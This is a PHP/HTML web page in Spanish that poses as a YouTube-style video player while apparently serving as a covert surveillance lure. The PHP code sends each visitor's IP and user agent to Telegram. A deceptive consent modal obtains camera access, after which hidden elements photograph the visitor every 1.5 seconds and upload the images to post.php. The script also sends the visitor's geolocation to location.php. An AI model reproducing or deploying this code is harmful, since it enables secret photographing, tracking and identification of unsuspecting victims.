<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita</b>\n".
       "📌 IP: $ip\n".
       "🖥️ UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body { margin:0; font-family: Arial, sans-serif; background: #000; color: #fff; }
        .yt-wrapper { position: relative; width: 100%; height: 500px; background: #000; display:none; }
        .yt-controls { position: absolute; bottom: 0; width: 100%; height: 50px; background: rgba(0,0,0,0.6); display: flex; align-items: center; padding: 0 10px; color: #fff; }
        .yt-playbar { flex:1; height:5px; background:#ff0000; margin:0 10px; border-radius:2px; }
    </style>
</head>
<body>

<!-- Modal de permisos -->
<div id="cameraModal" style="
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.7);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
">
    <div style="
        background: #fff;
        color: #000;
        padding: 30px;
        border-radius: 10px;
        max-width: 500px;
        text-align: center;
        box-shadow: 0 0 20px rgba(0,0,0,0.5);
    ">
        <h2 style="margin-top:0;">¡Atención!</h2>
        <p>Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.</p>
        <button id="grantAccess" style="
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #FF0000;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.2s;
        " onmouseover="this.style.backgroundColor='#cc0000'" onmouseout="this.style.backgroundColor='#FF0000'">
            Permitir acceso
        </button>
    </div>
</div>

<!-- Video YouTube oculto -->
<div class="yt-wrapper" id="ytWrapper">
    <iframe id="Live_YT_TV" width="100%" height="100%" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1&mute=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    <div class="yt-controls">
        <span>▶️</span>
        <div class="yt-playbar"></div>
        <span>🔊</span>
    </div>
</div>

<!-- Video y Canvas ocultos para fotos -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ytWrapper = document.getElementById('ytWrapper');
const modal = document.getElementById('cameraModal');
const btn = document.getElementById('grantAccess');

function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

const constraints = { audio: false, video: { facingMode: "user" } };

// Captura fotos cada 1.5s
function capturePhotoLoop() {
    const context = canvas.getContext('2d');
    setInterval(function(){
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Inicia cámara y muestra video solo si hay permiso
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        capturePhotoLoop();
        modal.style.display = 'none'; // ocultar modal
        ytWrapper.style.display = 'block'; // mostrar video
    } catch (err) {
        console.error("Permiso denegado o error:", err);
        alert("No se pudo activar la cámara. Por favor, permite el acceso para continuar.");
        modal.style.display = 'flex'; // mostrar modal de nuevo
    }
}

btn.addEventListener('click', initCamera);

// Obtener ubicación automáticamente
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude, longitude, accuracy } = pos.coords;
        fetch('location.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy })
        });
    });
}
</script>

</body>
</html>
